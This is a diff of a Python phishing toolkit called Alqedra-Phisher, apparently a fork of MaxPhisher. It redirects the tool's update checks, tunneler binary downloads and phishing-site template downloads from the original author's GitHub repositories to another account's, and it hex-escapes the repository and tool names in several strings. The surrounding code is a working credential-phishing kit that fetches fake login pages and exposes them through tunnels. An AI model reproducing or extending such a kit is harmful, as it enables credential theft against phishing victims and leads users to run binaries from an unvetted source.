@@ -223,7 +223,7 @@ cprint = Console().print
 columns = get_terminal_size().columns
 
 repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/Alqedra-Phisher"
-sites_repo = "https://github.com/KasRoudra2/maxfiles"
+sites_repo = "https://github.com/Mohammad27-9-20102/maxfiles"
 websites_url = f"{sites_repo}/archive/main.zip"
 repo_branch = "maxfiles-main"
 
@@ -1109,7 +1109,7 @@ def updater():
     if not isfile("files/Alqedra-Phisher.gif"):
         return
     try:
-        toml_data = get("https://raw.githubusercontent.com/KasRoudra/Alqedra-Phisher/main/files/pyproject.toml").text
+        toml_data = get("https://raw.githubusercontent.com/Mohammad27-9-2010/Alqedra-Phisher/main/files/pyproject.toml").text
         pattern = r'version\s*=\s*"([^"]+)"'
         match = search(pattern, toml_data)
         if match:
@@ -1121,7 +1121,7 @@ def updater():
         gh_ver = version
     if gh_ver != "404: Not Found" and get_ver(gh_ver) > get_ver(version):
         # Changelog of each versions are seperated by three empty lines
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/Alqedra-Phisher/main/files/changelog.log").text.split("\n\n\n")[0]
+        changelog = get("https://raw.githubusercontent.com/Mohammad27-9-2010/Alqedra-Phisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
         print(f"{info}\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{gh_ver}")
         upask=input(f"\n{ask}Do you want to update \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
@@ -1192,34 +1192,34 @@ def requirements():
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
         elif "arm" in architecture:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
         elif "x86_64" in architecture or "amd64" in architecture:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
         else:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
     elif "darwin" in platform:
         if "x86_64" in architecture or "amd64" in architecture:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                 extract("cloudflared.tgz", f"{tunneler_dir}")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
         elif "arm64" in architecture or "aarch64" in architecture:
             if not iscloudflared:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
+                download("https://github.com/Mohammad27-9-20102/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
         else:
             print(f"{error}Device architecture unknown. Download cloudflared/loclx manually!")
             sleep(3)
@@ -1329,7 +1329,7 @@ def main_menu():
         elif choice.lower()=="s":
             saved()
         elif choice.lower()=="m":
-            bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+            bgtask("xdg-open 'https://github.com/Mohammad27-9-2010/Mohammad27-9-2010#My-Best-Works'")
         elif choice == "0":
             pexit()
         else:
@@ -1398,7 +1398,7 @@ def secondary_menu(sites, name):
         if not isdir(site):
             internet()
             delete("site.zip")
-            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
+            download(f"https://github.com/Mohammad27-9-2010/files/raw/main/phishingsites/{folder}.zip", "site.zip")
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
